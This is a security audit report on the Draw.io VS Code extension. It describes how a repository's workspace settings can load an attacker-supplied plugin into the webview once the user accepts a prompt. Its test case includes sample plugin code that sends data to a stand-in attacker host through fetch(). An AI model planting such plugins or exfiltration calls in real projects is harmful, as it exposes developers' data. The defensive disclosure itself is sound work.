# Vulnerabilities Found

## Arbitrary Plugin Code Execution via Malicious Workspace Plugin Configuration

- **Vulnerability Name:** Arbitrary Plugin Code Execution via Malicious Workspace Plugin Configuration

- **Description:**  
  The Draw.io integration extension allows workspaces to specify external plugin files via a configuration setting ("hediet.vscode‐drawio.plugins") that uses template variables (for example, using "${workspaceFolder}"). A threat actor who supplies a manipulated repository can include a custom ".vscode/settings.json" that points the plugin configuration to a file under the attacker's control (for example, a "malicious-plugin.js" stored in the repository). When the victim opens a diagram file in that repository, the extension will (after a simple fingerprint check and user prompt) read the JavaScript code from the specified plugin file and load it directly into the draw.io webview. Because the plugin code is executed with the privileges afforded to the webview (and may later interact with the extension's API), this mechanism permits arbitrary code execution in the context of the extension. In summary, by including a crafted workspace setting and a malicious plugin file in a repository, an attacker can achieve remote code execution (RCE) in the victim's VS Code environment.

- **Impact:**  
  An attacker who successfully triggers this vulnerability could run arbitrary JavaScript in the extension's webview. This may result in unauthorized access to sensitive information (such as credentials or local file contents), potential privilege escalation, or further lateral movement within the VS Code environment. In effect, it gives the attacker broad control over aspects of the victim's VS Code session when working on that repository.

- **Vulnerability Rank:** Critical

- **Currently Implemented Mitigations:**  
  • When loading plugins, the extension (in its "getPlugins" function in DrawioClientFactory.ts) computes a SHA256 fingerprint of the plugin code and compares it with entries stored under "hediet.vscode-drawio.knownPlugins".  
  • If a plugin is "unknown" (i.e. its fingerprint is not yet stored as allowed), the user is prompted (via a dialogue box) to explicitly allow or disallow loading the plugin.

- **Missing Mitigations:**  
  • There is no additional validation or sandboxing of plugin code; the check relies solely on a user decision based on a computed fingerprint.  
  • The system does not enforce any trust boundaries on where a plugin file may be loaded from (the template simply substitutes "${workspaceFolder}" without validating that the file comes from a "trusted" location).  
  • There is no mechanism for digital signing or certificate‐based validation of plugin code that could automatically reject untrusted or manipulated plugin files.

- **Preconditions:**  
  • The victim must open a repository whose workspace settings (e.g. ".vscode/settings.json") include a configuration for "hediet.vscode‐drawio.plugins" that points to an attacker‐controlled JavaScript file (for example, using a template that resolves to "${workspaceFolder}/malicious-plugin.js").  
  • The malicious plugin file must be present in the repository.  
  • The user must not have preexisting information about the plugin (or may inadvertently accept the "allow" prompt when the unknown plugin is detected).

- **Source Code Analysis:**  
  1. In **Config.ts** the getter for plugins is defined as follows:  
     - The code calls  
       ```js
       public get plugins(): { file: Uri }[] {
         return this._plugins.get().map((entry) => {
           const fullFilePath = this.evaluateTemplate(entry.file, "plugins");
           return { file: Uri.file(fullFilePath) };
         });
       }
       ```  
       Here the user‑provided setting (typically stored in the workspace settings file) is processed by a simple template engine (see SimpleTemplate.ts) that substitutes "${workspaceFolder}" with the actual workspace folder path. No further sanitization of the file path is performed.
  2. In **DrawioClientFactory.ts**, the method `getPlugins()` iterates over each plugin entry from the configuration. For each plugin entry:  
     - It reads the file content via `await workspace.fs.readFile(p.file)`.  
     - A SHA256 fingerprint is computed and compared against stored settings via `config.isPluginAllowed(...)`.  
     - If no stored decision is found, the user is prompted to "allow" or "disallow" loading the plugin.
  3. Once accepted, the plugin's JavaScript code is pushed into an array (`pluginsToLoad`) that is later injected into the draw.io iframe (see the call to "new CopyPlugin" in the webpack config is not related – the code simply passes the raw plugin code to the webview).  
  4. Because the plugin code is not sandboxed beyond the host's webview security restrictions, an attacker‐controlled plugin can run arbitrary JavaScript in an environment that has access both to the draw.io client state and to any messaging functions (via "sendEvent") exposed by the extension.

- **Security Test Case:**  
  1. **Preparation:**  
     - Create a test repository that includes a ".vscode/settings.json" file containing the following (or similar) configuration:  
       ```json
       {
         "hediet.vscode-drawio.plugins": [
           { "file": "${workspaceFolder}/malicious-plugin.js" }
         ]
       }
       ```  
     - In the root of the repository, include a file named "malicious-plugin.js" that contains a simple but clearly malicious payload. For example, the code might log a distinctive message to the Developer Tools console and send an HTTP request to a controlled endpoint:
       ```js
       Draw.loadPlugin(function(ui) {
         console.log("Malicious plugin executed!");
         fetch("https://attacker.example.com/steal?data=" + encodeURIComponent(JSON.stringify({ workspace: window.location.href })));
       });
       ```
  2. **Execution:**  
     - Open the repository in VS Code with the Draw.io extension installed.  
     - Open any supported diagram file (for example, a ".drawio" file) so that the draw.io editor is activated.
  3. **Observation:**  
     - The extension (via its plugin‐loading logic) will detect the plugin configuration and, if the plugin has not been previously "known," present a prompt asking whether or not to allow the plugin "malicious-plugin.js."  
     - If the user accepts the prompt, the content of "malicious-plugin.js" is read, its fingerprint recorded, and its contents are injected into the draw.io webview.
  4. **Validation:**  
     - Open the Developer Tools in VS Code's webview or check the "Drawio Integration Log" output channel to verify that "Malicious plugin executed!" appears.  
     - (Alternatively, monitor the network or the controlled endpoint to see if the HTTP request was sent.)  
  5. **Conclusion:**  
     - Successful execution of the payload confirms that arbitrary code execution was achieved via the malicious plugin – demonstrating a critical vulnerability.